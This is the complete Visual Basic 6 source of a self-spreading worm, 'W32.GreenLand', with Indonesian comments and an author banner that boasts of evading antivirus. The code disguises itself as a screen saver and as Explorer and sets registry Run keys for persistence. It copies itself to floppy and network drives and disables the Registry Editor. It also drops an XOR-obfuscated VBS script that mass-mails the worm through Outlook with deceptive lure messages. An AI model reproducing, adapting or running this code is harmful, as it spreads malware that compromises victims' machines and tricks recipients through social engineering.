VERSION 5.00
Begin VB.Form GreenFrm 
   Appearance      =   0  'Flat
   BackColor       =   &H80000005&
   BorderStyle     =   0  'None
   Caption         =   "Form1"
   ClientHeight    =   960
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   4680
   Icon            =   "GreenFrm.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   960
   ScaleWidth      =   4680
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Visible         =   0   'False
   Begin VB.Timer GreenTime 
      Interval        =   2
      Left            =   0
      Top             =   0
   End
   Begin VB.Label Label2 
      Alignment       =   2  'Center
      BackColor       =   &H00FFFFFF&
      Caption         =   "HAPPY NEW YEAR"
      BeginProperty Font 
         Name            =   "Arial Black"
         Size            =   15.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      Height          =   495
      Left            =   0
      TabIndex        =   1
      Top             =   480
      Width           =   4695
   End
   Begin VB.Label Label1 
      Alignment       =   2  'Center
      BackColor       =   &H000000C0&
      Caption         =   "GreenLand ALERT...!!!"
      BeginProperty Font 
         Name            =   "Arial Black"
         Size            =   15.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000C000&
      Height          =   495
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   4695
   End
End
Attribute VB_Name = "GreenFrm"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'  `,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,
'`,`,`,`,                                                                     `,`,`,`,
'`,`,`,  W32.GreenLand                                                          `,`,`,
'`,`,`,  Sekarang gw akan mencoba untuk membuat worm dengan VB6                 `,`,`,
'`,`,`,  Seperti biasa Sebelumnya...... gw pengen sharing ilmu,                 `,`,`,
'`,`,`,  dan worm ini gw tujukan semata-mata untuk pendidikan,                  `,`,`,
'`,`,`,  jadi gw sepenuhnya gak bertanggung jawab atas segala tindakan          `,`,`,
'`,`,`,  yang melanggar hukum / merusak sehubungan dengan worm-worm             `,`,`,
'`,`,`,  yang gw buat.                                                          `,`,`,
'`,`,`,  Bergembiralah gw karena untuk saat ini 15.07.2004 worm ini             `,`,`,
'`,`,`,  lolos dari seleksi NAV 2003                                            `,`,`,
'`,`,`,`,                                                                     `,`,`,`,
'  `,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,
'  `,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,
'`,`,`,`,                                                                     `,`,`,`,
'`,`,`,  About Virus :                                                          `,`,`,
'`,`,`,  - Virusname ................... W32.GreenLand                          `,`,`,
'`,`,`,  - Author ...................... Spidey                                 `,`,`,
'`,`,`,  - Encrypted ................... Ya, tapi hanya bagian mail spread      `,`,`,
'`,`,`,  - Infected .................... Tidak....                              `,`,`,
'`,`,`,  - Spread ...................... Drive A, OutLook (2 bahasa), Network   `,`,`,
'`,`,`,  - PayLoad ..................... Ya, merubah Volume Name Drive C        `,`,`,
'`,`,`,                                  Happy New Year, tiap tlg. 1 bln. 1     `,`,`,
'`,`,`,  - Origin ...................... GreenLand - United State of Indonesia  `,`,`,
'`,`,`,                                                                         `,`,`,
'`,`,`,  Written : Spidey - 15.07.2004                                          `,`,`,
'`,`,`,            GreenLand - United State of Indonesia                        `,`,`,
'`,`,`,  Contact : G2iP(at)SoftHome(dot)net                                     `,`,`,
'`,`,`,  Website : www.Spidey.uni.cc                                            `,`,`,
'`,`,`,                                                                         `,`,`,
'  `,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,`,
'
Private Sub Form_Load()
On Error Resume Next    'Biar ngejos
nfile = LCase(App.EXEName)  'Nama filenya dijadikan lower case
If nfile = "w32wgrd" Then   'Apa nama file sama dengan w32wgrd
App.Title = "Explorer"  'Jika ya maka Titlenya adalah Explorer
Else
If nfile = "greenland" Then 'Atau nama filenya sama dengan greenland
App.Title = "Screen Saver"  'Ya, maka titlenya Screen Saver
End If
End If
Call install    'Install worm
End Sub

Sub install()
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")    'buat system object
Set win = fso.GetSpecialFolder(0)   'Dapatkan special folder %windir%
Set sys = fso.GetSpecialFolder(1)   'Dapatkan special folder %system%
fpath = App.Path    'Path dari wormnya
If Right(App.Path, 1) <> "\" Then   'Apakah bagian kanan path ada karkter "\" nya
fpath = fpath & "\" 'Jika tidak maka tambahkan karakter "\"
End If
fnama = App.EXEName 'Nama filenya
If LCase(App.Title) = "explorer" Then   'Apakah title worm yang sedang jalan adalah "explorer"
FileCopy fpath & fnama & ".exe", sys & "\" & "GreenLand.scr"    'Jika ya maka copy dari execute file menjadi screen saver
FileCopy fpath & fnama & ".exe", "a:\GreenLand.scr"     'infeksi Drive A
tls_reg "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\AVScreen", sys & "\" & "GreenLand.scr"  'Start bersamaan saat windows di load
tls_reg "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\W32wgrd", win & "\" & "W32wgrd.exe"     'sama dengan baris diatas
Else
If LCase(App.Title) = "screen saver" Then   'Apakah title worm yang sedang jalan adalah "screen saver"
FileCopy fpath & fnama & ".scr", win & "\" & "W32wgrd.exe"  'Jika ya maka copy dari screen saver dan jadikan file execute
FileCopy fpath & fnama & ".scr", "a:\W32wgrd.exe"   'infeksi Drive A
tls_reg "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\W32wgrd", win & "\" & "W32wgrd.exe"     'Gak perlu gw jelasin lagi
tls_reg "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\AV_Screen", sys & "\" & "GreenLand.scr" 'Idem
End If
End If
Set dc = fso.GetDrive("c:\")    'Tentukan target Drive-nya
If dc.VolumeName <> "GreenLand" Then    'Apakah VolumeName-nya sama dengan GreenLand
dc.VolumeName = "GreenLand" 'Jika tidak maka ganti menjadi GreenLand
End If
Call mail_spread    'Sebarkan melalui email
Call net_spread     'Coba sebarkan melalui Network
End Sub
'
Sub mail_spread()
On Error Resume Next    'Biar penyebarannya lancar
Open (".\GreenMail.vbs") For Output As #1   'Buat GreenMail.vbs untuk menyebarkan worm
'Bagian dibawah ini gak perlu gw jelasin panjang lebar, dan kalo loe pengen tahu loe baca aja artikel gw mengenai "Spidey Worm Middle Finger"
Print #1, "'Drc7xvgg7*7TervcrXu}rtc?5Xbc{xx|9Vgg{~tvc~xy5>^q7Yxc7xvgg7*7557CryQxe7Rvt7td7^y7xvgg9PrcYvzrDgvtr?5ZVG^5>9Vsserdd[~dcdQxe7peg7*7&7Cx7td9VsserddRyce~rd9TxbycDrc7xzv~{7*7xvgg9Tervcr^crz?'>xzv~{9Ert~g~rycd9Vss7td9VsserddRyce~rd?peg>xzv~{9Dbu}rtc7*75Dterry7Dvare5xzv~{9Uxsn7*7uxsnHcrocxzv~{9Vccvtzrycd9Vss7dvarexzv~{9Sr{rcrVqcreDbuz~c7*7Cebrxzv~{9DrysYrocYrocRys7^q"
Print #1, "'Function Sexy(stext):For ICAL = 1 To Len(stext):hash = Chr(Asc(Mid(stext, ICAL, 1)) Xor Len(""Spidey"") + Len(""Still god a blues"")):TIC = TIC & hash:Sexy = TIC:Next:End Function"
Print #1, "On Error Resume Next"
Print #1, "Set fso = CreateObject(""Scripting.FileSystemObject"")"
Print #1, "of = fso.OpenTextFile(Wscript.ScriptName, 1).ReadAll"
Print #1, "text_1 = ""Hallo pren..."" & vbCrLf & ""Percaya apa gak, gw udah kelar membuat Screen Saver 3D"" & vbCrLf & ""Coba deh loe cek attachment-nya, gw tanggung gak bakal nyesel...."""   'Teks ke 1 untuk body email yang akan menyebar
Print #1, "text_2 = ""This is a magic 3D Screen Saver, that's my own screen saver."" & vbCrLf & ""check out the attachment 'n fine  a some think special message for you."" & vbCrLf & ""Love you honey..."" & vbCrLf & vbCrLf" 'Teks ke 2 dalam dengan bahasa inggris, biar keren coy.....
Print #1, "text_3 = ""Bilieve it or not, this is a great Screen Saver, I like this one and I have you like too..."""    'Yang ke 3 juga, biar kelihatan merintis ( merintis apa britis ya..., hehehehe)
Print #1, "text_4 = ""Percaya apa gak terserah kamu ?,"" & vbCrLf & ""Screen Saver ini sangat bagus dan pasti loe bakal suka""" 'Nah yang terakhir pake bahasa Indonesia dan sedikit ngibul (karena orang kita paling suka kalau dikibuli...)
Print #1, "daf_text_mail = Array(text_1, text_2, text_3, text_4)"   'Dekalarasikan semua teks untuk body menjadi ke dalam array
Print #1, "Randomize: body_text = daf_text_mail(Int(Rnd * 4))"  'Pilih secara acak (kayak arisan gitu...)
Print #1, "Set sys = fso.GetSpecialFolder(1)"   'Sebernanya gw gak mau pake get special di bagian ini, tapi mau gimana lagi, gw terpaksa
Print #1, "Set win = fso.GetSpecialFolder(0)"
Print #1, "If fso.FileExists(sys & "".\GreenLand.scr"") Then"   'Apa ada GreenLand.scr di %system%
Print #1, "saver = sys & ""\GreenLand.scr"""    'Jika ya maka attachmentnya adalah GreenLand.scr
Print #1, "Else saver = win & ""\W32wgrd.exe"""     'Jika tidak maka attachmentnya adalah W32wgrd.exe
Print #1, "End If"
Print #1, "execute Mid(of, 395, 175)"
Print #1, "execute Sexy(Mid(of, 2, 390))"
Print #1, "fso.DeleteFile(""GreenMail.vbs"")"   'Hapus GreenMail.vbs
Close #1
Shell "Wscript GreenMail.vbs"   'GreenMail.vbs dibantu Wscript
tls_reg "HKCU\Software\GreenPath\Infected\With", "W32.GreenLand"    'Sebagai informasi aja bahwa kompie-nya udah pernah ditiduri ama W32.GreenLand
tls_reg "HKCU\Software\GreenPath\Infected\Origin", "GreenLand - United State of Indonesia"  'Yang originalnya berasal dari GreenLan - Indonesia
tls_reg "HKCU\Software\GreenPath\Infected\CopyRight", "(c) 2004 by Spidey"  'dan dibuat pada tahun 2004 oleh gw sendiri
tls_reg "HKCU\Control Panel\Desktop\ScreenSaveActive", "1"  'install di registry
tls_reg "HKCU\Control Panel\Desktop\SCRNSAVE.EXE", sys & "\" & "GreenLand.scr"  'jadikan sebagai default screensaver
tls_reg "HKCU\Control Panel\Desktop\ScreenSaveTimeOut", "60"    'tentukan time outnya 1 menit
tls_rep "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "REG_DWORD"   'Disable Registri Editor
End Sub

'Mapping semua Drive
Sub net_spread()
On Error Resume Next
For Each dc In fso.Drives
Set fso = CreateObject("Scripting.FileSystemObject")
If dc.DriveType = 2 Or dc.DriveType = 3 Then
If UCase(dc.Path) <> "C:" Then
If dc.IsReady Then
If LCase(App.Title) = "explorer" Then
FileCopy fpath & fnama & ".exe", sys & "\" & "GreenLand.scr"
Else
If LCase(App.Title) = "screen saver" Then
FileCopy fpath & fnama & ".scr", win & "\" & "W32wgrd.exe"
End If
End If
End If
End If
End If
Next
End Sub

Private Sub GreenTime_Timer()
If Day(Now()) = 1 And Month(Now()) = 1 And Second(Now()) = 1 Then   'Apa sekarang tanggal 1 bulan 1 dan detik ke 1
GreenFrm.Visible = True     'Jika ya, maka Happy New Year
Else
If Second(Now()) > 5 Then   'Jika detik lebih dari 5 maka,
GreenFrm.Visible = False  'Sembunyikan ucapan Happy New Year dan tunggu sampai tahun baru berikutnya
End If
End If
If Second(Now()) = 1 Then   'Apa detik = 1
Call Form_Load  'kalo ya, panggil Form_load
End If
End Sub

Function tls_reg(key, value)    'Fungsi tulis pada registry
Set ws = CreateObject("Wscript.Shell")  'Buat Objectnya
ws.RegWrite key, value  'Install key dan value di registry
End Function

Function tls_rep(key, value, kes)   'Sama dengan diatas, hanya ditambah type Valuenya
Set ws = CreateObject("Wscript.Shell")
ws.RegWrite key, value, kes
End Function
